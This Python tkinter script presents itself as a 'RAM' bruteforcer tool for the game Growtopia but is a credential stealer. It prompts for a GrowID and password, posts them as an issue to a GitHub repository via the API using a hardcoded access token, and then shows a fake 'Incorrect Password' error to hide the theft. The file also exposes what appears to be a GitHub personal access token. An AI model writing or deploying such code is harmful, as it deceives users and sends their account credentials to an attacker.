import tkinter as tk
from tkinter import messagebox
import requests
import json

def send_to_github():
    input1 = entry1.get()
    input2 = entry2.get()

    # Prepare message to send
    message = f"Input 1: {input1}\nInput 2: {input2}"

    # Replace 'YOUR_GITHUB_USERNAME' and 'YOUR_GITHUB_REPO' with your GitHub username and repository
    url = 'https://api.github.com/repos/K-Ku/Growtopia-Ram-Bruteforcer/issues'
    # GitHub API token (you may need to generate one in your GitHub settings)
    headers = {'Authorization': 'token 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'}
    # Create issue payload with the user message
    data = {'title': 'User Input', 'body': message}
    # Send POST request to create a new issue with the user message
    response = requests.post(url, headers=headers, data=json.dumps(data))
    if response.status_code == 201:
        messagebox.showinfo("Error", "Incorrect Password/GrowID - RAM cant operate without being linked to a main account.")
    else:
        messagebox.showerror("Error", f"Failed to send message to GitHub. Status code: {response.status_code}")

# Create the main window
root = tk.Tk()
root.title("GitHub Message Sender")
root.configure(background='black')  # Set background color to black

# Create labels and entry widgets
label1 = tk.Label(root, text="Enter your GrowID:", bg='black', fg='white')  # Set label color to white
label1.pack()
entry1 = tk.Entry(root, bg='black', fg='white')  # Set entry color to white
entry1.pack()

label2 = tk.Label(root, text="Enter your Password:", bg='black', fg='white')  # Set label color to white
label2.pack()
entry2 = tk.Entry(root, show="*", bg='black', fg='white')  # Set entry color to white and show '*' for password
entry2.pack()

# Create button to send message
send_button = tk.Button(root, text="Start Ram..", command=send_to_github, bg='black', fg='white')  # Set button color to black and text color to white
send_button.pack()

# ASCII art squid image
ascii_art = '''
     _                      _______                      _
  _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_
 dP'  ~YMMb            dOOOOOOOOOOOOOOOb            aMMP~  `Yb
 V      ~"Mb          dOOOOOOOOOOOOOOOOOb          dM"~      V
          `Mb.       dOOOOOOOOOOOOOOOOOOOb       ,dM'
           `YMb._   |OOOOOOOOOOOOOOOOOOOOO|   _,dMP'
      __     `YMMM| OP'~"YOOOOOOOOOOOP"~`YO |MMMP'     __
    ,dMMMb.     ~~' OO     `YOOOOOP'     OO `~~     ,dMMMb.
 _,dP~  `YMba_      OOb      `OOO'      dOO      _aMMP'  ~Yb._

             `YMMMM\`OOOo     OOO     oOOO'/MMMMP'
     ,aa.     `~YMMb `OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.
   ,dMYYMba._         `OOOOOOOOOOOOOOOOO'          _,adMYYMb.
  ,MP'   `YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   `YM.
  MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       `YM
  YMb           ~YMMMM\`OOOOI`````IOOOOO'/MMMMP~           dMP
   `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'
     `'                  `OObNNNNNdOO'                   `'
                           `~OOOOO~'

=====================================================================
'''

# Create label for ASCII art
ascii_label = tk.Label(root, text=ascii_art, bg='black', fg='white', font=("Courier", 8))  # Set label color to white and font to Courier
ascii_label.pack()

# Create label for "RAM" text
ram_label = tk.Label(root, text="RAM", bg='black', fg='white', font=("Courier", 20))  # Set label color to white, font to Courier, and size to 20
ram_label = tk.Label(root, text="RAM", bg='black', fg='white', font=("Courier", 20))  # Set label color to white, font to Courier, and size to 20
ram_label.pack()

# Start the Tkinter event loop
root.mainloop()
